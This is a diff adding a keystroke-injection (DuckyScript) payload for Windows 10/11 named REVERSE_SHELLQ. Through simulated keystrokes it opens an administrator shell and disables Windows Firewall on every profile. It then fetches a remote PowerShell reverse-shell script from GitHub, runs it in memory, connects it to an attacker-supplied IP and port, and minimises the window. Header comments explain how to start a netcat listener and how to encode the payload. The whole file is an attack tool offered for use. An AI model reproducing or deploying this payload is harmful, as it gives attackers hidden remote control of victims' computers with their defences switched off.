@@ -1,0 +1,41 @@
+ REM #########################################################################################################################
+ REM                 Title:    REVERSE_SHELLQ                                                                                                                                                                                                        
+ REM                 Description: Disables Windows Firewall And Starts A Minimized Reverse Shell
+ REM                 Props: MajoesQ                                                                                                                                                                                                                          
+ REM                 Targets: Windows 10/11 {TESTED ON WINDOWS 11/10}                                                                                                                                                                                                     
+ REM                 MajoesQ ASSUMES NO RESPONSIBILITY FOR ANY DAMAGES OR STOLEN DATA "USE AT YOUR OWN RISK"                                                                                                       
+ REM                 DON'T FORGET TO START LISTENER "stty raw -echo; (stty size; cat) | nc -lvnp PORT  ATACKERS_IP {FOR LINUX}                           
+ REM                 DON'T FORGET TO CHANGE ATACKERS IP AND PORT  IN LINE 25
+ REM                 DON'T FORGET TO ENCODE AT "https://payloadstudio.hak5.org/community/"
+ REM #########################################################################################################################
+REM    ENJOY :}
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT 
+DELAY 500
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+DELAY 600
+ENTER
+DELAY 1000
+STRING IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP PORT
+DELAY 1000
+ENTER
+ALT SPACE
+DELAY 400
+DOWN
+DELAY 400
+DOWN
+DELAY 400
+DOWN
+DELAY 400
+DOWN
+DELAY 400
+ENTER
+CAPSLOCK
+END
+REM This is the end #################################################################################################################################################
